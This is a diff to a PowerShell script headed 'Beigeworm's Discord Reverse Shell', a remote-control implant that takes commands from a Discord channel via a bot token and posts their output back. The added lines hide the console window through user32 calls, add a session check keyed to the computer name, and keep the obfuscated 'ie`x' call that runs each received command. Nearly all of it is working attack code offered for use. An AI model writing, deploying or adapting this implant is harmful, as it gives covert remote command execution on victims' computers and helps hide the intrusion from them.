@@ -1,3 +1,4 @@
+
 <# ============================================= Beigeworm's Discord Reverse Shell ========================================================
 
 **SYNOPSIS**
@@ -35,24 +36,6 @@ $previouscmd = $null
 $authenticated = 0
 $HideWindow = 1 # HIDE THE WINDOW - Change to 1 to hide the console window while running
 
-# Uncomment $hide='y' below to hide the console
-
-# $hide='y'
-if($hide -eq 'y'){
-    $w=(Get-Process -PID $pid).MainWindowHandle
-    $a='[DllImport("user32.dll")] public static extern bool ShowWindowAsync(IntPtr hWnd,int nCmdShow);'
-    $t=Add-Type -M $a -Name Win32ShowWindowAsync -Names Win32Functions -Pass
-    if($w -ne [System.IntPtr]::Zero){
-        $t::ShowWindowAsync($w,0)
-    }else{
-        $Host.UI.RawUI.WindowTitle = 'xx'
-        $p=(Get-Process | Where-Object{$_.MainWindowTitle -eq 'xx'})
-        $w=$p.MainWindowHandle
-        $t::ShowWindowAsync($w,0)
-    }
-}
-
-
 function PullMsg {
     $headers = @{
         'Authorization' = "Bot $token"
@@ -76,35 +59,55 @@ function PullMsg {
 
 function sendMsg {
     param([string]$Message)
-
+    $dir = $PWD.Path
     $url = "https://discord.com/api/v9/channels/$chan/messages"
-
     $webClient = New-Object System.Net.WebClient
     $webClient.Headers.Add("Authorization", "Bot $token")
-    $webClient.Headers.Add("Content-Type", "application/json")
-    $webClient.Encoding = [System.Text.Encoding]::UTF8
-
     if ($Message) {
-        $jsonBody = @{
-            "content" = $Message
-            "username" = "Agent"
-        } | ConvertTo-Json
-
-        try {
+            $jsonBody = @{
+                "content" = "$Message"
+                "username" = "$dir"
+            } | ConvertTo-Json
+            $webClient.Headers.Add("Content-Type", "application/json")
             $response = $webClient.UploadString($url, "POST", $jsonBody)
             Write-Host "Message sent to Discord"
         }
-        catch {
-            Write-Host "[ERROR] Discord API error:"
-            Write-Host $_.Exception.Response.StatusCode.value__
-            Write-Host $_.Exception.Message
-            Write-Host $_.Exception.Response.GetResponseStream()
+    }
+
+
+Function HideConsole{
+    If ($HideWindow -gt 0){
+    $Async = '[DllImport("user32.dll")] public static extern bool ShowWindowAsync(IntPtr hWnd, int nCmdShow);'
+    $Type = Add-Type -MemberDefinition $Async -name Win32ShowWindowAsync -namespace Win32Functions -PassThru
+    $hwnd = (Get-Process -PID $pid).MainWindowHandle
+        if($hwnd -ne [System.IntPtr]::Zero){
+            $Type::ShowWindowAsync($hwnd, 0)
+        }
+        else{
+            $Host.UI.RawUI.WindowTitle = 'hideme'
+            $Proc = (Get-Process | Where-Object { $_.MainWindowTitle -eq 'hideme' })
+            $hwnd = $Proc.MainWindowHandle
+            $Type::ShowWindowAsync($hwnd, 0)
         }
     }
 }
 
+Function Authenticate{
+    if ($response -like "$env:COMPUTERNAME"){
+        $script:authenticated = 1
+        $script:previouscmd = $response
+        sendMsg -Message ":white_check_mark:  **$env:COMPUTERNAME** | ``Session Started!``  :white_check_mark:"
+        sendMsg -Message "``PS | $dir>``"
+    }
+    else{
+        $script:authenticated = 0
+        $script:previouscmd = $response
+    } 
+}
+
 # =============================================================== MAIN LOOP =========================================================================
 
+HideConsole
 PullMsg
 $previouscmd = $response
 sendMsg -Message ":hourglass:  **$env:COMPUTERNAME** | ``Session Waiting..``  :hourglass:"
@@ -128,8 +131,8 @@ while ($true) {
                 sendMsg -Message ":hourglass:  **$env:COMPUTERNAME** | ``Session Waiting..``  :hourglass:"
             }
             elseif (!($response -like "$previouscmd")) {
-                $Result = (ie`x($response) | Out-String)
-                if ([string]::IsNullOrWhiteSpace($Result)) {
+                $Result = ie`x($response) -ErrorAction Stop
+                if (($result.length -eq 0) -or ($result -contains "public_flags") -or ($result -contains "                                           ")) {
                     $script:previouscmd = $response
                     sendMsg -Message ":white_check_mark:  ``Command Sent``  :white_check_mark:"
                     sleep -m 250
@@ -165,5 +168,3 @@ while ($true) {
     }
     sleep 5
 }
-
-
